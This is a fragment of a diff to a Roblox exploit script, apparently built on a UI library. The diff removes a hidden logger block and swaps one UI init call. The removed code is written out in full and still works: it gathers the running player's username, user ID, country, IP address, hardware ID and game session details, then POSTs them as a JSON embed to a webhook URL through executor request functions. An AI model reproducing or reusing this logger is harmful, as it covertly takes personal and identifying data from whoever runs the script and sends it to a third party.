-                ["name"] = "(Someone Executed The Script)",
-                ["url"] = "https://roblox.com",
-            },
-            ["description"] =
-                "\n__[Player Info](https://www.roblox.com/users/" .. Userid .. ")__" ..
-                " **\nDisplay Name:** " .. DName ..
-                " \n**Username:** " .. Name ..
-                " \n**User Id:** " .. Userid ..
-                "\n**MembershipType:** " .. MembershipType ..
-                "\n**AccountAge:** " .. AccountAge ..
-                "\n**Country:** " .. Country ..
-                "**\nIP:** " .. GetIp ..
-                "**\nHwid:** " .. GetHwid ..
-                "**\nDate:** " .. tostring(os.date("%m/%d/%Y")) ..
-                "**\nTime:** " .. tostring(os.date("%X")) ..
-                "\n\n__[Game Info](https://www.roblox.com/games/" .. game.PlaceId .. ")__" ..
-                "\n**Game:** " .. GAMENAME ..
-                " \n**Game Id**: " .. game.PlaceId ..
-                " \n**Exploit:** " .. webhookcheck ..
-                "" ..
-                "\n\n**Data:**" .. "```" .. GetData .. "```" ..
-                "\n\n**JobId:**" .. "```" .. ConsoleJobId .. "```",
-            ["type"] = "rich",
-            ["color"] = tonumber(0xf2ff00),
-            ["thumbnail"] = {
-                ["url"] = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. game.Players.LocalPlayer.UserId .. "&width=150&height=150&format=png"
-            }
-        }
-    }
-}
-
-local newdata = game:GetService("HttpService"):JSONEncode(data)
-
-local headers = {
-    ["content-type"] = "application/json"
-}
-
-request = http_request or request or HttpPost or syn.request
-local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
-request(abcdef)
-wait(1)
-
-
-------------------------------------------------------------------------------------------------------------------------
-
-OrionLib:Init()
+Window:Init()
